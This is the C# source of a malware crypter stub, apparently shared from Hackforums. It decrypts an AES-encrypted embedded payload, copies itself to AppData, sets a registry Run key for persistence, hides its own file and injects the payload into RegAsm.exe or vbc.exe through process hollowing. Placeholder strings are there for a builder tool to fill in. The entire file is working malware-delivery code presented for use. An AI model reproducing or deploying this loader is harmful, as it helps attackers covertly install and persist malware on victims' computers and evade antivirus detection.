﻿using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Diagnostics;
using System.ComponentModel;
using System.Text;
//Copyright 2016
//Made by mrmutt for hackforums uid=3005497
//Please leave this note here

//This is just a file i used to test the stub.
//Ignore

namespace stupidcancercodeisruiningeverything
{

    static class Program
    {
        [STAThread]
        static void Main0()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new FrmOne());
        }

    }


    class Reader
    {
        public static byte[] ReadManaged()
        {
            ResourceManager manager = new ResourceManager("Encrypted", Assembly.GetEntryAssembly());
            byte[] bytes = (byte[])manager.GetObject("encfile");
            return bytes;
        }
    }

    public class FrmOne : Form
    {

        private void InitializeComponent()
        {
            SuspendLayout();
            ResumeLayout(false);
            PerformLayout();
            ShowInTaskbar = false;
            WindowState = FormWindowState.Minimized;

        }

        bool _startup = true;
        string injectTo = "[inject-replace]";
        string injectionPath2 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe");
        string injectionPath3 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
        bool _persistence = true;
        Process[] pname = Process.GetProcessesByName("[sprocess-replace]");
        public FrmOne()
        {

            InitializeComponent();
            Thread.Sleep(5 * 100);
            if (_persistence)
            {
                System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
                timer1.Interval = 500;
                Thread.Sleep(500);
                timer1.Start();
            }
            byte[] fBytes = Reader.ReadManaged();
            string encKey = "[key-replace]";
            byte[] encKey2 = Encoding.UTF8.GetBytes(encKey);
            encKey2 = SHA256.Create().ComputeHash(encKey2);
            byte[] eBytes = AESDecrypt(fBytes, encKey2);
            string result = Encoding.UTF8.GetString(eBytes);
            byte[] eBytes2 = Convert.FromBase64String(result);
            if (_startup)
                AddToStartup();

            HideFile();
            Thread.Sleep(500);


            if (injectTo == "[itself]")
                RunPe1.Run(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, "", eBytes2);
            if (injectTo == "[regasm]")
                RunPe1.Run(injectionPath2, "", eBytes2);
            if (injectTo == "[vbc]")
                RunPe1.Run(injectionPath3, "", eBytes2);
            Environment.Exit(0);
        }


        public static byte[] AESDecrypt(byte[] decrypted, byte[] key2)
        {
            byte[] decryptedBytes = null;

            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(key2, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (CryptoStream cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(decrypted, 0, decrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            return decryptedBytes;
        }
        public void AddToStartup()
        {

            string path = Path.Combine(Application.UserAppDataPath, "[fname-replace]");
            string path2 = Path.Combine(path, "[finame-replace].exe");
            string pathreg = Path.Combine(Environment.SpecialFolder.ApplicationData.ToString(), "[regfname-replace]", "[regfiname-replace].exe");
            if (!File.Exists(path2))
            {
                DirectoryInfo di = Directory.CreateDirectory(path);
                File.Copy(Application.ExecutablePath, path2, true);
                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (key != null) key.SetValue("[regkey-replace]", path2);
            }
        }

        public void HideFile()
        {
            FileInfo f = new FileInfo(Application.ExecutablePath);
            f.Attributes = FileAttributes.Hidden;
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            string path = Path.Combine(Application.UserAppDataPath, "/[fname-replace]");
            string path2 = Path.Combine(path, "[finame-replace].exe");
            if (pname.Length == 0)
                Process.Start(pname.ToString());
        }
    }



    static class RunPe1
    {

        [DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);

        [DllImport("kernel32.dll", EntryPoint = "GetThreadContext")]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", EntryPoint = "SetThreadContext")]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

        [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory")]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

        [DllImport("ntdll.dll", EntryPoint = "NtUnmapViewOfSection")]
        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);

        [DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx")]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        [DllImport("kernel32.dll", EntryPoint = "ResumeThread")]
        private static extern int ResumeThread(IntPtr handle);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            private readonly uint ProcessId;
            private readonly uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;

            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        public static bool Run(string path, string cmd, byte[] data)
        {

            int readWrite = 0;
            string quotedPath = string.Format("\"{0}\"", path);

            StartupInformation si = new StartupInformation();
            ProcessInformation pi = new ProcessInformation();

            si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));

            if (string.IsNullOrEmpty(cmd))
            {
                if (!CreateProcess(path, quotedPath, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref si, ref pi))
                    return false;
            }
            else
            {
                quotedPath = quotedPath + " " + cmd;
                if (!CreateProcess(path, quotedPath, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref si, ref pi))
                    return false;
            }

            int fileAddress = BitConverter.ToInt32(data, 60);
            int imageBase = BitConverter.ToInt32(data, fileAddress + 52);

            int[] context = new int[179];
            context[0] = 65538;

            if (!GetThreadContext(pi.ThreadHandle, context))
                return false;

            int ebx = context[41];
            int baseAddress = 0;

            if (!ReadProcessMemory(pi.ProcessHandle, ebx + 8, ref baseAddress, 4, ref readWrite))
                return false;

            if (imageBase == baseAddress)
            {
                if (NtUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0)
                    return false;
            }

            int sizeOfImage = BitConverter.ToInt32(data, fileAddress + 80);
            int sizeOfHeaders = BitConverter.ToInt32(data, fileAddress + 84);

            bool allowOverride = false;
            int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 12288, 64);

            if (newImageBase == 0)
            {
                allowOverride = true;
                newImageBase = VirtualAllocEx(pi.ProcessHandle, 0, sizeOfImage, 12288, 64);
                if (newImageBase == 0)
                    return false;
            }

            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, data, sizeOfHeaders, ref readWrite))
                return false;

            int sectionOffset = fileAddress + 248;
            short numberOfSections = BitConverter.ToInt16(data, fileAddress + 6);

            for (int I = 0; I <= numberOfSections - 1; I++)
            {
                int virtualAddress = BitConverter.ToInt32(data, sectionOffset + 12);
                int sizeOfRawData = BitConverter.ToInt32(data, sectionOffset + 16);
                int pointerToRawData = BitConverter.ToInt32(data, sectionOffset + 20);

                if (sizeOfRawData != 0)
                {
                    byte[] sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(data, pointerToRawData, sectionData, 0, sectionData.Length);

                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite))
                        return false;
                }

                sectionOffset += 40;
            }

            byte[] pointerData = BitConverter.GetBytes(newImageBase);
            if (!WriteProcessMemory(pi.ProcessHandle, ebx + 8, pointerData, 4, ref readWrite))
                return false;

            int addressOfEntryPoint = BitConverter.ToInt32(data, fileAddress + 40);

            if (allowOverride)
                newImageBase = imageBase;
            context[44] = newImageBase + addressOfEntryPoint;

            if (!SetThreadContext(pi.ThreadHandle, context))
                return false;
            if (ResumeThread(pi.ThreadHandle) == -1)
                return false;

            return true;
        }
    }
}



